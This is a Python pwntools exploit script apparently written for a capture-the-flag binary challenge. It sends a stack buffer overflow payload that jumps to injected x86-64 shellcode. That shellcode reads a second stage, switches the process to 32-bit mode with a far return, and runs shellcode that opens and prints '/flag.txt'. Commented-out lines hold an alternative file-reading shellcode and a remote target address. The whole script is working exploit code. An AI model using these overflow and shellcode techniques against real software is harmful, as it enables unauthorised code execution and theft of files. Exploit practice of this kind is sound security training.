from pwn import *
elf = context.binary= ELF('./challenge')
context.arch = 'amd64'
#p = process()
#p = remote('34.126.117.161',3000)
script = """
b*main+147
c
"""
p = gdb.debug('./challenge',script)
payload = cyclic(56) + p64(0x00000000004012fa) + cyclic(0x141-64) 
payload += b'\x48\xC7\xC0\x00\x00\x00\x00\x48\x31\xFF\x48\xBE\x00\x01\xBB\xAA\x00\x00\x00\x00\x48\xC7\xC2\x64\x00\x00\x00\x0F\x05'
payload += b'\x48\x31\xE4\xBC\x90\x00\xBB\xAA\x67\xC7\x44\x24\x04\x23\x00\x00\x00\x67\xC7\x04\x24\x10\x01\xBB\xAA\xCB'


p.sendline(payload)
#time.sleep(0.2)
#payload2 = asm('nop')*0x15 + b'\x6A\x00\xBA\x6F\x75\x73\x65\x52\xBA\x61\x72\x65\x68\x52\xBA\x2E\x2F\x2F\x77\x52\x89\xE3\xB9\x00\x10\x00\x00\xB8\x05\x00\x00\x00\xCD\x80'
#payload2 += b'\x89\xC3\x8D\x0D\x50\x00\x00\x00\xBA\x00\x05\x00\x00\xB8\x8D\x00\x00\x00\xCD\x80'
payload2 = p.send(asm('nop')*0x15+b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff"+b"/flag.txt\x00")
#p.sendline(payload2)
p.interactive()
